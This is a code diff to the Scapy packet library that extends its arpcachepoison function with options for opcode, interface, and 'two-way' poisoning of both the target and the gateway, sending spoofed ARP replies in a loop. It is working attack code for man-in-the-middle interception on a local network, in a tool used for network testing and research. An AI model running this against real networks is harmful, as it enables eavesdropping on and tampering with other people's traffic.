@@ -441,23 +441,76 @@ conf.l3types.register(ETH_P_ARP, ARP)
 
 
 @conf.commands.register
-def arpcachepoison(gWay, target = None, interval = 3):
+def arpcachepoison(gWay, target = None, opcode = 'who-has', direction = 'one-way', iFace = None, interval = 3):
     """Poison an ARP cache with your MAC Address
     Where gWay is the Gateway for the subnet, use the following as an example:
-    arpcachepoison(gWay, [target = None], [interval = 3])
+    arpcachepoison(gWay, [target = None], [opcode = 'who-has'], \
+    [direction = 'one-way'], [iFace = None], [interval = 3])
+
     If no target is declared, then poison the whole subnet.
+    If no target is declared, opcode is hardcoded for 'is-at'.
+    If no target is declared, direction is hardcoded to 'one-way'.
+
+    If target is declared, direction may be set to 'two-way'
+
+    iFace is the interface and the recommended practice
+    is to let scapy deal with it.
     """
+    ## Grab our hwaddr if we are defining an interface
+    if iFace:
+        smac = get_if_hwaddr(iFace)
+
+    ## Broadcast attack
     if target is None:
-        p = Ether(dst = 'ff:ff:ff:ff:ff:ff')/ARP(op = "is-at", hwdst = 'ff:ff:ff:ff:ff:ff', psrc = gWay)
+        p = Ether(dst = 'ff:ff:ff:ff:ff:ff')/ARP(op = 'is-at', hwdst = 'ff:ff:ff:ff:ff:ff', psrc = gWay)
+
+    ## Targeted attack
     else:
+        gmac = getmacbyip(gWay)
         tmac = getmacbyip(target)
-        p = Ether(dst = tmac)/ARP(op = "is-at", psrc = gWay, pdst = target)
+        
+        ## Let scapy decide the interface
+        if not iFace:
+            p = Ether(dst = tmac)/ARP(op = opcode, psrc = gWay, pdst = target)
+
+        ## You choose the interface
+        else:
+            p = Ether(src = smac, dst = tmac)/ARP(op = opcode, psrc = gWay, pdst = target)
+
+        if direction == 'two-way':
+
+            ## Let scapy decide the interface
+            if not iFace:
+                p2 = Ether(dst = gmac)/ARP(op = opcode, psrc = target, pdst = gWay)
+
+            ## You choose the interface
+            else:
+                p2 = Ether(src = smac, dst = gmac)/ARP(op = opcode, psrc = target, pdst = gWay)
+
     try:
-        while 1:
-            sendp(p, iface_hint=target)
-            if conf.verb > 1:
-                os.write(1,".")
-            time.sleep(interval)
+        ## Let scapy decide the interface
+        if not iFace:
+            while 1:
+                sendp(p, iface_hint=target)
+                p.show()
+                if direction == 'two-way':
+                    sendp(p2, iface_hint=target)
+                    p2.show()
+                if conf.verb > 1:
+                    os.write(1,".")
+                time.sleep(interval)
+
+        ## You choose the interface
+        else:
+            while 1:
+                sendp(p, iface = iFace)
+                p.show()
+                if direction == 'two-way':
+                    sendp(p2, iface = iFace)
+                    p2.show()
+                if conf.verb > 1:
+                    os.write(1,".")
+                time.sleep(interval)
     except KeyboardInterrupt:
         pass
 
